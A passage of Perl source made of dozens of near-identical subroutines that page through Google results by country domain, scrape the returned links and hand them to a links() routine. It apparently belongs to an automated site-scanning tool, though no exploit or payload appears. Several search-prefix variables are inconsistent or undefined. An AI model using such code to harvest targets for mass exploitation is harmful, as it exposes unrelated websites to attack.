sub jackus() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackus.uri_escape($key)."%2Bsite%3Aus%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jacksi() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jacksi.uri_escape($key)."%2Bsite%3Asi%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackbe() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackbe.uri_escape($key)."%2Bsite%3Abe%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackbiz() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackbiz.uri_escape($key)."%2Bsite%3Abiz%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackza() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackza.uri_escape($key)."%2Bsite%3Aza%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackie() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackie.uri_escape($key)."%2Bsite%3Aie%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jacktv() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jacktv.uri_escape($key)."%2Bsite%3Atv%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackam() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackam.uri_escape($key)."%2Bsite%3Aam%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jacksk() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jacksk.uri_escape($key)."%2Bsite%3Ask%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackno() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($mac.uri_escape($key)."%2Bsite%3Ano%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jacksg() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Asg%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackch() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Ach%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackse() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Ase%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackws() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Aws%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jacktw() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Atw%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackbg() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Abg%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackco() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Aco%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackhr() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Ahr%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackfi() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Afi%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackgr() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Agr%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackhk() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Ahk%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackpe() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Ape%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackpt() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Apt%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jacktr() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($apple.uri_escape($key)."%2Bsite%3Atr%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackgo() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackgo.uri_escape($key)."%2Bsite%3Ago%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub google() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com/search?q=".uri_escape($key)."&num=100&filter=0&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sub googleCA() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ca/search?q=".uri_escape($key)."&hl=&cr=countryCA&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleDE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.de/search?q=".uri_escape($key)."&hl=&cr=countryDE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleDE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleUK() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.uk/search?q=".uri_escape($key)."&hl=&cr=countryUK&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleUK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleFR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.fr/search?q=".uri_escape($key)."&hl=&cr=countryFR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleFR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleES() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.es/search?q=".uri_escape($key)."&hl=&cr=countryES&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleES/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleIT() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.it/search?q=".uri_escape($key)."&hl=&cr=countryIT&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleNL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.nl/search?q=".uri_escape($key)."&hl=&cr=countryNL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleNL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleBE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.be/search?q=".uri_escape($key)."&hl=&cr=countryBE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleBE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCH() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ch/search?q=".uri_escape($key)."&hl=&cr=countryCH&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub googleSE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.se/search?q=".uri_escape($key)."&hl=&cr=countrySE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleSE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleDK() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.dk/search?q=".uri_escape($key)."&hl=&cr=countryDK&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleDK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleNO() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.no/search?q=".uri_escape($key)."&hl=&cr=countryNO&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleNO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleNZ() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.nz/search?q=".uri_escape($key)."&hl=&cr=countryNZ&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleNZ/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleIE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ie/search?q=".uri_escape($key)."&hl=&cr=countryIE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleBR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.br/search?q=".uri_escape($key)."&hl=&cr=countryBR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub googleAR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.ar/search?q=".uri_escape($key)."&hl=&cr=countryAR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleAR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCO() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.co/search?q=".uri_escape($key)."&hl=&cr=countryCO&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCU() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.cu/search?q=".uri_escape($key)."&hl=&cr=countryCU&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleCL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.cl/search?q=".uri_escape($key)."&hl=&cr=countryCL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleMX() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.mx/search?q=".uri_escape($key)."&hl=&cr=countryMX&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleMX/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleAU() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.au/search?q=".uri_escape($key)."&hl=&cr=countryAU&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleAU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleRU() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.ru/search?q=".uri_escape($key)."&hl=&cr=countryRU&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleRU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleAT() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.at/search?q=".uri_escape($key)."&hl=&cr=countryAT&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleAT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googlePL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.pl/search?q=".uri_escape($key)."&hl=&cr=countryPL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googlePL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub googleIL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.il/search?q=".uri_escape($key)."&hl=&cr=countryIL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleTR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.tr/search?q=".uri_escape($key)."&hl=&cr=countryTR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleTR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleUA() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.ua/search?q=".uri_escape($key)."&hl=&cr=countryUA&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleUA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleGR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.gr/search?q=".uri_escape($key)."&hl=&cr=countryGR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleGR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleJP() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.jp/search?q=".uri_escape($key)."&hl=&cr=countryJP&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleJP/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCN() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.cn/search?q=".uri_escape($key)."&hl=&cr=countryCN&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCN/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleMY() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.my/search?q=".uri_escape($key)."&hl=&cr=countryMY&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleMY/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleTH() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.th/search?q=".uri_escape($key)."&hl=&cr=countryTH&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleTH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleIN() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.in/search?q=".uri_escape($key)."&hl=&cr=countryIN&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIN/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleKR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.kr/search?q=".uri_escape($key)."&hl=&cr=countryKR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleKR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleRO() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ro/search?q=".uri_escape($key)."&hl=&cr=countryRO&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleRO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleTW() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.tw/search?q=".uri_escape($key)."&hl=&cr=countryTW&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleTW/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleZA() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.za/search?q=".uri_escape($key)."&hl=&cr=countryZA&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleZA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googlePT() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.pt/search?q=".uri_escape($key)."&hl=&cr=countryPT&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googlePT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub walla() {
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=100; $b+=1) {
